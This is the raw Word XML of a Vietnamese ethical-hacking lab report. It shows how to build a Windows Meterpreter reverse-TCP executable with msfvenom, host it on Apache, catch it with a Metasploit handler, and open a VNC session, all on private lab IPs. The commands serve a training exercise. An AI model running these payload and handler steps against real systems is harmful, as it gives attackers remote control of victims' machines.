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C6FB" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>BÀI 5.4 – THIẾT LẬP PHIÊN VNC TRONG LAB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5416811F" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Nguồn: </w:t>
      </w:r>
      <w:r>
        <w:t>Samsar4/Ethical-Hacking-Labs, 5-System-Hacking/4-VNC-Session.md</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E64585A" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Mục tiêu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9E6995" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tạo payload thử nghiệm và thiết lập reverse handler trong mạng lab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4560C1" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Thiết lập phiên Meterpreter giữa Kali và Windows VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329DADF9" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Quan sát khả năng mở phiên VNC từ Meterpreter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6627E579" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Môi trường thực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636DFD" w14:paraId="3E87FB62" w14:textId="77777777">
        <w:trPr>
          <w:tblHeader/>
          <w:jc w:val="center"/>
        </w:trPr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B3FC1" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Thành phần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99F11" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Thông tin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="14A25D33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3BEE3" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Máy thực hiện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ECD9A" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Kali Linux cài Metasploit Framework và Apache2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="599A280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E2640" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Máy mục tiêu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E2BFB" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Windows 10 VM trong mạng lab</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="6C27F445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D96E4" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IP Kali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26B37" w14:textId="3CB547CF" w:rsidR="00636DFD" w:rsidRDefault="00095BCA">
            <w:r>
              <w:t>192.168.81.136</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="02BC76D0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2EC5B" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IP Windows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25179" w14:textId="40A22D67" w:rsidR="00636DFD" w:rsidRDefault="00095BCA">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>192.168.81.133</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="6E9D548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6B39A" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Phạm vi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4CA9A" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Chỉ thực hiện trên VM có snapshot và được cấp quyền</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24BFBB8C" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00636DFD"/>
    <w:p w14:paraId="6A8AA5E0" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Các bước thực hiện</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640A6F2B" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1. Tạo tệp thử nghiệm bằng msfvenom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F57BAEE" w14:textId="0A4E6A67" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="340" w:right="170"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=</w:t>
      </w:r>
      <w:r w:rsidR="00095BCA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">192.168.81.136 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">LPORT=4444 -o </w:t>
      </w:r>
      <w:r w:rsidR="00101A2C" w:rsidRPr="00101A2C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/home/kali/Desktop/Test.exe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36DFD" w14:paraId="4F3E50B2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B3565" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Tùy chọn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C4420" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000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636DFD" w14:paraId="677E4B33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AAB09" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>-p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0411A" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Chọn payload windows/meterpreter/reverse_tcp.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="1FF1A2DF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7CBAD" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>--platform windows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D981E" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Chỉ định nền tảng đích là Windows.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="6329F240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2151D" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>-a x86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0B3AE" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Chọn kiến trúc x86.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="0038A2FE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F6B7F" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>-f exe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BD6B5" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Xuất tệp định dạng EXE.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="0E05782E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9775" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>LHOST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C2B49" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IP Kali nhận kết nối ngược.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="0530B8F9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02E8B" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>LPORT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635F4" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Cổng listener trên Kali.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="20930DF0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DF15" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>-o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EEC11" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Đường dẫn tệp đầu ra.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="448A67C9" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00636DFD"/>
    <w:p w14:paraId="31080F57" w14:textId="65AB65EF" w:rsidR="00636DFD" w:rsidRDefault="00AF16DC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B7277AF" wp14:editId="6633A8DB">
            <wp:extent cx="6332220" cy="1699895"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13982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8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3.2. Chia sẻ tệp bằng Apache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D413913" w14:textId="3E5C7B23" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="340" w:right="170"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo mkdir -p /var/www/html/share</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>sudo chmod -R 755 /var/www/html/share</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>sudo chown -R www-data:www-data /var/www/html/share</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">sudo cp </w:t>
      </w:r>
      <w:r w:rsidR="00101A2C" w:rsidRPr="00101A2C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/home/kali/Desktop/Test.exe</w:t>
      </w:r>
      <w:r w:rsidR="00101A2C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/var/www/html/share/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>sudo service apache2 start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36DFD" w14:paraId="7F182C57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757C8" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Lệnh / tùy chọn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F713D" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000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636DFD" w14:paraId="66E7BCB3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F71F" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>mkdir -p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414B" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Tạo thư mục; không báo lỗi nếu thư mục đã tồn tại.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="4ECEF759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F12CA" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>chmod -R 755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0C194" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Đặt quyền đọc/thực thi phù hợp cho thư mục chia sẻ.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="5C85D03B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3EE17" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>chown -R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1E39D" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Đổi chủ sở hữu cho toàn bộ nội dung thư mục.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="52A97E4B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24B3E" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>cp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D3AE7" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Sao chép tệp vào thư mục web.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="11668D5E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EDCEF" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>service apache2 start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EA6ED" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Khởi động web server Apache2.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CF88F22" w14:textId="59844785" w:rsidR="00CB3FEE" w:rsidRDefault="00CB3FEE">
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="42B89973" wp14:editId="143CCC76">
            <wp:extent cx="6332220" cy="3745230"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="175973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32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F8ED" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>3.3. Tạo handler trong Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B24490" w14:textId="521D7BA0" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="340" w:right="170"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>use exploit/multi/handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>set payload windows/meterpreter/reverse_tcp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">set LHOST </w:t>
      </w:r>
      <w:r w:rsidR="00CB3FEE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.81.136</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>set LPORT 4444</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>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36DFD" w14:paraId="352A93AA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CFF17" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Thành phần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2C05D" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000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636DFD" w14:paraId="4458E6E5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FBF78" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>use exploit/multi/handler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128DA" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Chọn module nhận kết nối từ payload bên ngoài.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="5D3B85DD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EC5C6" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>set payload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5FA98" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Đặt payload phải trùng với tệp đã tạo.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="5F69D5C9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B57A9" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>set LHOST / LPORT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EC935" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Cấu hình địa chỉ và cổng lắng nghe.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00636DFD" w14:paraId="7C40DB8D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B708F" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>run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A1768" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Khởi chạy handler.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F33AA34" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00636DFD"/>
    <w:p w14:paraId="64794C3F" w14:textId="5C01FE1F" w:rsidR="00CB3FEE" w:rsidRDefault="006D290A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="537ED236" wp14:editId="5DB03FDB">
            <wp:extent cx="6332220" cy="1727835"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="60226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8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FEE">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6CD5CDB0" wp14:editId="16A5C01E">
            <wp:extent cx="6332220" cy="3575685"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="7147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56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3688" w14:textId="6FC7F119" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4. Mở phiên VNC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081DD4E7" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Trên Windows VM, tải và chạy tệp thử nghiệm theo hướng dẫn của bài lab. Khi Meterpreter đã mở, thực hiện:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7D5F0E" w14:textId="319F6E40" w:rsidR="00636DFD" w:rsidRDefault="00602BE6">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:ind w:left="340" w:right="170"/>
      </w:pPr>
      <w:r w:rsidRPr="00602BE6">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sysinfo</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:br/>
        <w:t>run vnc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36DFD" w14:paraId="08B55552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60A48" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>run vnc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5233B" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Khởi chạy module VNC từ phiên Meterpreter trong lab.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F96D7D3" w14:textId="749A2AB0" w:rsidR="00636DFD" w:rsidRDefault="00602BE6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5964A68F" wp14:editId="79CB64D2">
            <wp:extent cx="6332220" cy="4147820"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="187562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20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DFD" w:rsidSect="00034616">
      <w:footerReference w:type="defaul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71D3C" w14:textId="77777777" w:rsidR="008007BD" w:rsidRDefault="008007BD">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="5E18116F" w14:textId="77777777" w:rsidR="008007BD" w:rsidRDefault="00800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A32" w14:textId="77777777" w:rsidR="00636DFD" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
      </w:rPr>
      <w:t>Báo cáo thực hành - Ethical Hacking Labs - Phần 5 System Hacking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BEE5" w14:textId="77777777" w:rsidR="008007BD" w:rsidRDefault="008007BD">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="41979CA5" w14:textId="77777777" w:rsidR="008007BD" w:rsidRDefault="00800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716015">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="171918747">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="630139557">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="970134158">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1670912236">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="139467956">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1800146465">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1426657968">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="56526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BCA"/>
    <w:rsid w:val="00101A2C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003E789A"/>
    <w:rsid w:val="00602BE6"/>
    <w:rsid w:val="00636DFD"/>
    <w:rsid w:val="006D290A"/>
    <w:rsid w:val="008007BD"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AF16DC"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CB3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D7DA86"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{372FA12C-30ED-4341-AF2E-931886E2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5.4 – THIẾT LẬP PHIÊN VNC TRONG LAB</vt:lpstr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5.4 – THIẾT LẬP PHIÊN VNC TRONG LAB</dc:title>
  <dc:subject>Báo cáo thực hành 5.4</dc:subject>
  <dc:creator>OpenAI</dc:creator>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>Tran Manh Duc 20230247P</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
